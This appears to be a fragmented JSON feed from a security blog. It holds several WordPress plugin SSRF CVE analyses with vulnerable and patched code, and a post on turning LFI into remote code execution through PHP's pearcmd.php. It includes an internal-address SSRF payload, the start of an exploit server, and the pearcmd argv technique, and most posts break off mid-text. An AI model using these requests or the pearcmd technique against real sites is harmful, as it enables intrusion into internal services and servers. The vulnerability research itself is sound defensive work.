); $unsplash_404 = 'https://images.unsplash.com/photo-1446704477871-62a4972035cd?fit=crop\u0026fm=jpg\u0026h=800\u0026q=50\u0026w=1200'; $redirectUrls = array(); foreach( $urls as $url ) { $response = wp_safe_remote_head( esc_url_raw( $url ), array( 'timeout' =\u003e 5, 'redirection' =\u003e 5, ) ); $headers = is_array( $response ) \u0026\u0026 ! empty( $response['headers'] ) ? $response['headers']-\u003egetAll() : array(); $redirectUrl = ! empty( $headers['location'] ) ? $headers['location'] : false; $redirectUrl = ( $redirectUrl !== $unsplash_404 ) ? $redirectUrl : false; $redirectUrls[ $url ] = $redirectUrl; } if ( ! empty( $redirectUrls ) ) { wp_send_json_success( $redirectUrls ); } else { status_header( 400 ); wp_send_json_error(); } } The patch replaces wp_remote_head() with wp_safe_remote_head() together with esc_url_raw() to sanitize and allow only valid URLs, and adds protective parameters timeout =\u003e 5 and redirection =\u003e 5. This prevents requests to internal/loopback addresses and reduces performance-related risks. Vulnerable Code The call self::validate_nonce( 'image' ); is used to verify a nonce ‚Äî WordPress‚Äôs mechanism to prevent CSRF (Cross-Site Request Forgery). public static function validate_nonce( $name ) { $nonce = ! empty( $_POST[ self::$nonces[ $name ] ] ) ? $_POST[ self::$nonces[ $name ] ] : null; $valid = wp_verify_nonce( $nonce, self::$nonces[ $name ] ); if ( ! $valid ) { status_header( 401 ); wp_send_json_error(); } } The plugin defines a static $nonces array that maps actions to nonce keys: protected static $nonces = array( 'image' =\u003e 'boldgrid_gridblock_image_ajax_nonce', 'setup' =\u003e 'boldgrid_editor_setup', 'gridblock_save' =\u003e 'boldgrid_editor_gridblock_save', ); When validat","date":"2025-11-01","objectID":"/posts/2025-11-01-cve-2025-52713/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-52713 Analysis \u0026 POC","uri":"/posts/2025-11-01-cve-2025-52713/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress ZoloBlocks Plugin.","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info A Server-Side Request Forgery (SSRF) vulnerability in BdThemes ZoloBlocks allows an attacker to make forged requests from the server. This issue affects ZoloBlocks versions from an unspecified initial version up to 2.3.11. CVE ID: CVE-2025-60161 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.3.11 Patched Versions: 2.3.12 CVSS severity: Low (5.4) Required Privilege: Unauthenticated Product: WordPress ZoloBlocks Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - ZoloBlocks: 2.3.11 (vulnerable) and 2.3.12 (patched). Diff tool - Meld or any diff/comparison tool to inspect differences between the two versions. Analysis Patch diff The vulnerability existed in the file TemplatesV1.php, however this file was removed in the patched release. TemplatesV1.php was removed in the patch Vulnerable Code public function demo_import() { // Check input parameter from POST if (!isset($_POST['json_file_url'])) { wp_send_json_error('No JSON file URL provided'); return; } // Retrieve and sanitize the user-provided URL $json_file_url = sanitize_text_field(wp_unslash($_POST['json_file_url'])); // Send an HTTP request to that URL $response = wp_remote_get($json_file_url, ['timeout' =\u003e 30]); // If there's an error when fetching data, return a JSON error if (is_wp_error($response)) { wp_send_json_error('Failed to fetch JSON data'); return; } // Retrieve the response body and decode the JSON $body = wp_remote_retrieve_body($response); $data = json_decode($body, true); $content = $data['content'] ?? ''; // Return a successful JSON response including the imported content wp_send_json_success([ 'status' =\u003e 'success', 'message' =\u003e __('Pattern imported successfully!', 'zoloblocks'), 'content' =\u003e $content, ]); } Bug The demo_import() function accepts a URL from the user ‚Üí issues an HTTP request (wp_remote_get) to fetch JSON ‚Üí decodes it and returns the result via wp_send_json_success(). Because it does not validate or restrict the URL, it can be abused to cause SSRF. The demo_import() function is registered as a callback for an action hook: add_action('wp_ajax_nopriv_zolo_demo_import', [$this, 'demo_import']); This means: The wp_ajax_nopriv_ hook is used for unauthenticated users (anonymous users). When a client sends an AJAX request to the endpoint admin-ajax.php?action=zolo_demo_import, WordPress will invoke the demo_import() function. Flow graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) ‚Üí extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) ‚Üí extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) ‚Üí extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] graph TD A[\"admin-ajax.php?action=zolo_demo_import\"] --\u003e B[\"wp_ajax_nopriv_zolo_demo_import\"] B --\u003e C[\"demo_import()\"] C --\u003e D[\"sanitize_text_field()\"] D --\u003e E[\"wp_remote_get(json_file_url)\"] E --\u003e F{\"is_wp_error(response)?\"} F -- Yes --\u003e G[\"wp_send_json_error()\"] F -- No --\u003e H[\"json_decode(body) ‚Üí extract URLs\"] H --\u003e I[\"wp_send_json_success()\"] Exploit Local Server Create a simple local service using Python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd())","date":"2025-10-31","objectID":"/posts/2025-10-31-cve-2025-60161/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-60161 Analysis \u0026 POC","uri":"/posts/2025-10-31-cve-2025-60161/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Feedzy Plugin.","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Feedzy RSS Aggregator plugin ‚Äì Feed to Post, Autoblogging, News \u0026 YouTube Video Feeds Aggregator for WordPress has a Server-Side Request Forgery vulnerability in all versions up to and including 5.1.0 via the function 'feedzy_sanitize_feeds'. This allows an authenticated attacker with Subscriber level access or higher to perform web requests to arbitrary addresses originating from the web application and can be used to query information from internal services. CVE ID: CVE-2025-11128 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.1.0 Patched Versions: 5.1.1 CVSS severity: Low (5) Required Privilege: Subscriber Product: WordPress Feedzy Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Feedzy: 5.1.0 (vulnerable) and 5.1.1 (patched). Diff tool - Meld or any diff/comparison tool to inspect and compare differences between the two versions. Analysis The Feedzy RSS Aggregator plugin registers a REST API endpoint at /feedzy/v1/feed/ which allows users to submit a URL to fetch feed data. However, in version 5.1.0, this endpoint is weakly protected and the URL filtering mechanism is unsafe, leading to a Server-Side Request Forgery (SSRF) vulnerability. Patch diff public function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function () { return is_user_logged_in(); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = esc_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { $feeds[] = esc_url( $item ); } return $feeds; } } In the vulnerable version: The endpoint only checks is_user_logged_in(), meaning any logged-in account (including Subscriber) can send requests. The function feedzy_sanitize_feeds() only uses esc_url() ‚Äî this function sanitizes a URL string for display, but does not validate correctness or restrict access to internal addresses. Bug Therefore, an attacker can send the payload url=http://localhost:8001/admin to coerce the server to send a request to an internal service ‚Üí SSRF. public function feedzy_register_rest_route() { register_rest_route( 'feedzy/v1', '/feed/', array( 'methods' =\u003e 'POST', 'callback' =\u003e array( $this, 'feedzy_rest_route' ), 'permission_callback' =\u003e function ( WP_REST_Request $request ) { $post_id = absint( $request-\u003eget_param( 'postId' ) ); return current_user_can( 'edit_post', $post_id ); }, 'args' =\u003e array( 'url' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_feeds' ), ), 'category' =\u003e array( 'sanitize_callback' =\u003e array( $this, 'feedzy_sanitize_categories' ), ), ), ) ); } public function feedzy_sanitize_feeds( $input ) { if ( count( $input ) === 1 ) { $feed = wp_http_validate_url( $input[0] ); return $feed; } else { $feeds = array(); foreach ( $input as $item ) { if ( wp_http_validate_url( $item ) ) { $feeds[] = esc_url_raw( $item ); } } return $feeds; } } The patch: Restricts REST API access using current_user_can( 'edit_post', $post_id ), allowing only Editors or Admins with the capability to call the endpoint. Replaces esc_url() with wp_http_validate_url(), ensuring the URL is valid, only accepts http/https protocols, and excludes internal addresses (loopback, localhost, 127.0.0.1...). Uses esc_url_raw() to safely store the URL without re-encoding for display. Info The count() in feedzy_sanitize_feeds() requires the input parameter to be Countable or an array. If a string is passed, PHP will throw an error: Bug Exception has occurred. TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given Therefore, when sending a request to the endpoint, the ur","date":"2025-10-30","objectID":"/posts/2025-10-30-cve-2025-11128/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/posts/2025-10-30-cve-2025-11128/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Real Cookie Banner Plugin.","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Real Cookie Banner: GDPR \u0026 ePrivacy Cookie Consent plugin for WordPress is vulnerable to Server-Side Request Forgery (SSRF) in all versions up to and including 5.2.4. The root cause is insufficient validation of the user-supplied URL at the REST API endpoint /scanner/scan-without-login. This allows authenticated attackers with administrator-level access to make web requests to arbitrary locations originating from the web application and can be used to query and modify information from internal services via the url parameter. CVE ID: CVE-2025-12136 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.2.4 Patched Versions: 5.2.5 CVSS severity: Low (5.5) Required Privilege: Administrator Product: WordPress Real Cookie Banner Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Real Cookie Banner: 5.2.4 (vulnerable) and 5.2.5 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between versions. Analysis Patch diff public function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } In the vulnerable version, routeScanWithoutLogin() takes the url parameter directly from $request-\u003eget_param('url') and uses it in wp_remote_get() without any validation or filtering =\u003e this leads to a Server-Side Request Forgery (SSRF) vulnerability. The response packages the full result from wp_remote_get($url) into JSON: status, statusText: HTTP status code and message. ok: true if status is 2xx. headers: all response headers. redirected, responseUrl: redirect information if present. body: response body content from the URL. =\u003e The server effectively forwards the entire response from the internal URL back to the caller, causing data leakage when SSRF is exploited. public function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); // Validate that the URL belongs to the jobs' domain to prevent SSRF attacks $jobDataUrl = $job-\u003edata-\u003eurl; $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 're","date":"2025-10-29","objectID":"/posts/2025-10-29-cve-2025-12136/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/posts/2025-10-29-cve-2025-12136/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Broken Link Notifier Plugin.","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Broken Link Notifier plugin for WordPress is vulnerable to Server‚ÄëSide Request Forgery in all versions up to and including 1.3.0 via the ajax_blinks() function which ultimately calls check_url_status_code(). This allows unauthenticated attackers to perform web requests to arbitrary addresses from the web application and can be used to query or modify information from internal services. CVE ID: CVE-2025-6851 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.3.0 Patched Versions: 1.3.1 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Broken Link Notifier Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Broken Link Notifier: 1.3.0 (vulnerable) and 1.3.1 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. Analysis Patch diff public function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code In the vulnerable version, the check_url_status_code() function calls wp_remote_get() directly with the user-supplied URL without validating or checking the safety of the URL. This creates a SSRF (Server-Side Request Forgery) vulnerability. This version does not check the URL scheme, whether the host is valid, or whether the IP belongs to private/reserved ranges, so all requests are executed without restriction. public function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Block SSRF to private/reserved ranges $unsafe = $this-\u003eis_url_unsafe( $link ); if ( $unsafe ) { return apply_filters( 'blnotifier_status', $unsafe ); } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code protected function is_url_unsafe( $url ) { $parts = wp_parse_url( $url ); if ( ! isset( $parts[ 'scheme' ], $parts[ 'host' ] ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: invalid or malformed URL', 'link' =\u003e $url ]; } $scheme = strtolower( $parts[ 'scheme' ] ); if ( ! in_array( $scheme, [ 'http', 'https' ], true ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: unsupported URL scheme', 'link' =\u003e $url ]; } $host = $parts[ 'host' ]; $records = @dns_get_record( $host, DNS_A + DNS_AAAA ); $ips = []; if ( is_array( $records ) \u0026\u0026 count( $records ) ) { foreach ( $records as $record ) { if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'A' \u0026\u0026 ! empty( $record[ 'ip' ] ) ) { $ips[] = $record[ 'ip' ]; } if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'AAAA' \u0026\u0026 ! empty( $record[ 'ipv6' ] ) ) { $ips[] = $record[ 'ipv6' ]; } } } else { $resolved = gethostbyname( $host ); if ( $resolved \u0026\u0026 $resolved !== $host ) { $ips[] = $resolved; } } if ( empty( $ips ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: host could not be resolved', 'link' =\u003e $url ]; } foreach ( $ips as $ip ) { if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: resolved to internal or reserved IP address', 'link' =\u003e $url ]; } } return false; // Safe } // End is_url_unsafe() The patch added the is_url_unsafe() function. Before calling wp_remote_get(), the URL is checked in detail: only http and https schemes are allowed, the host is ","date":"2025-10-28","objectID":"/posts/2025-10-28-cve-2025-6851/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/posts/2025-10-28-cve-2025-6851/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress PopupKit Plugin.","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info The Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers plugin for WordPress is vulnerable to Server-Side Request Forgery (SSRF) in all versions up to and including 2.1.4. The cause is insufficient validation of URLs supplied via the url parameter. This allows unauthenticated attackers to make web requests to arbitrary addresses originating from the web application, which can be used to query or modify information from internal services, as well as conduct network reconnaissance. The vulnerability was partially patched in version 2.1.4. CVE ID: CVE-2025-10861 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.1.4 Patched Versions: 2.1.5 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress PopupKit Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - PopupKit: 2.1.3 (vulnerable) and 2.1.5 (patched). Diff tool - Meld or any diff tool to compare differences between versions. Analysis Patch diff Because some source was partially patched in 2.1.4, we will analyze using version 2.1.3. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview', 'methods' =\u003e 'POST', 'callback' =\u003e 'fetch_external_content', 'permission_callback' =\u003e '__return_true', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } In version 2.1.3, the plugin defines a POST API with permission_callback =\u003e __return_true, allowing any user, including anonymous users, to invoke fetch_external_content() with a required url parameter. This function uses wp_remote_get to send a request to the provided URL and returns the response body. Because there is no mechanism to control or filter internal URLs, an attacker can send requests to internal services, leading to SSRF exploitable by anonymous users. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview-template', 'methods' =\u003e 'GET', 'callback' =\u003e 'fetch_external_content', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_safe_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } In the 2.1.5 fix, the plugin made several changes to mitigate SSRF risk: Changed the endpoint from /live-preview to /live-preview-template. Replaced wp_remote_get() with wp_safe_remote_get(), which helps WordPress automatically block requests to internal addresses such as localhost, 127.0.0.1, or 169.254.*. As a result, user-supplied requests to internal resources on the server are blocked, preventing straightforward SSRF exploitation. Vulnerable Code get_routes() is invoked inside register_routes(): protected $namespace = 'pbb/v1'; public function register","date":"2025-10-27","objectID":"/posts/2025-10-27-cve-2025-10861/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Spectra Plugin.","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info A Server Side Request Forgery (SSRF) vulnerability was discovered in the WordPress Spectra plugin (previously named Ultimate Addons for Gutenberg) affecting versions up to 2.6.6. CVE ID: CVE-2023-36679 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.6.6 Patched Versions: 2.6.7 CVSS severity: Low (7.1) Required Privilege: Contributor Product: WordPress Spectra Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Spectra: 2.6.6 (vulnerable) and 2.6.7 (patched). Diff tool - Meld or any diff/comparison tool to check and compare differences between the two versions. Analysis Patch diff Vulnerable version: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $api_uri = ( isset( $_REQUEST['api_uri'] ) ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } In version 2.6.6, the template_importer() function takes the api_uri parameter directly from $_REQUEST and uses that value to send an HTTP request via wp_remote_get(): Because there is no validation or source restriction, an attacker can supply an arbitrary URL to force the server to make requests to internal addresses. This creates a Server-Side Request Forgery (SSRF) vulnerability. Patched version: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $block_id = isset( $_REQUEST['id'] ) ? absint( $_REQUEST['id'] ) : ''; $block_data = get_option( 'ast-block-templates_data-' . $block_id ); $api_uri = null !== $block_data ? $block_data-\u003e{'astra-page-api-url'} : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } The patch removed taking a URL directly from user input. Instead, the code only accepts a block ID via $_REQUEST['id'] and retrieves the corresponding URL from the database (wp_options) under the key ast-block-templates_data-{id}: Thus, the URL is constrained to records managed by the system, eliminating the ability for a user to provide an arbitrary path. This mechanism prevents SSRF and increases safety when performing server-side API calls. Vulnerable Code template_importer() requires the user to have privileges from Contributor or higher if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } CSRF protection is implemented with a nonce named _ajax_nonce; if the nonce does not match, the logic exits and returns an error. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); Tip The disclosed vulnerability requires Contributor privileges, so the _ajax_nonce value is very likely present in the Admin UI code. For vulnerabilities tied to Contributor privileges and post cre","date":"2025-10-23","objectID":"/posts/2025-10-23-cve-2023-36679/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analyst"],"content":"Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php","date":"2025-10-22","objectID":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analyst"],"content":"Hello. After analyzing 10 CVEs related to LFI in WordPress plugins, I noticed a common barrier: many exploitation vectors are constrained by the requirement to have a .php suffix. This significantly reduces exploitability. During my research I found the article docker-php-include-getshell. That article describes a way to bypass the .php constraint by abusing the pearcmd.php file which is part of PHP‚Äôs PECL/PEAR toolkit and is present in WordPress environments deployed on Docker ‚Äî a very practical trick for no-upload scenarios. What are PEAR and PECL? PECL (PHP Extension Community Library): a command-line tool to install and manage PHP extensions. PEAR (PHP Extension and Application Repository): the library platform used by PECL. Before PHP 7.3, PEAR/PECL were often installed by default. From PHP 7.4 onward, PHP must be compiled with --with-pear to include them. However, in official PHP Docker images, PEAR/PECL are still often included, located under /usr/local/lib/php: root@e182501c47c4:/var/www/html# ls /usr/local/lib/php Archive Console OS PEAR PEAR.php Structures System.php XML build data doc extensions pearcmd.php peclcmd.php test pearcmd.php and register_argc_argv pearcmd.php is a PHP script designed to run in CLI mode, for example: php /usr/local/lib/php/pearcmd.php install somepackage It processes arguments from $argv and $argc. When run as CLI this data is obvious. If this file is included in a web context (via LFI), its CLI logic can be abused. The key point is the register_argc_argv setting. If register_argc_argv = On, PHP will populate: $argc $argv $_SERVER['argv'] `argv` in PHP configuration When WordPress is set up on Docker, register_argc_argv is often enabled by default. The question becomes: when PHP runs under a web SAPI (FPM/Apache) and not in CLI, where does $argv come from? Analysis of PHP Source Code In the PHP core there is logic like: if (PG(register_argc_argv)) { if (SG(request_info).argc) { ... } else { php_build_argv(SG(request_info).query_string, \u0026PG(http_globals)[TRACK_VARS_SERVER]); } } If there is no argc (not running CLI), PHP calls php_build_argv with SG(request_info).query_string ‚Äî i.e., the URL‚Äôs query string. For example: http://example.com/index.php?a=b\u0026c=d ‚Üí query_string = \"a=b\u0026c=d\" PHP will use this query string to build the argv variables, so $_SERVER['argv'] can be influenced by the query string. Consequence: When pearcmd.php is included via LFI in a web environment where $_SERVER['argv'] is generated from the query string, an attacker can control the command-line parameters that pearcmd.php reads. Thus, PEAR/PECL command functionality can be abused via the web to perform unwanted actions. RFC3875 Explain RFC3875 (the CGI spec) defines a form of ‚Äúindexed‚Äù HTTP query ‚Äî that is, a query string without unencoded = characters sent via GET or HEAD. When encountering such a query, the server SHOULD treat the query-string as a search-string, splitting it into search-words separated by +: search-string = search-word ( \"+\" search-word ) search-word = 1*schar After splitting, each search-word is URL-decoded, optionally re-encoded as system-defined, then added to the command-line argument list (argv) of the CGI program. In short: if the query-string contains no = and is a GET or HEAD request, the server may treat parts separated by + as arguments and pass them into argv. RFC3875 allows a server to turn an ‚Äúindexed‚Äù query-string (GET/HEAD, no unencoded =) into an argv list. The spec excerpt: 4.4. The Script Command Line Some systems 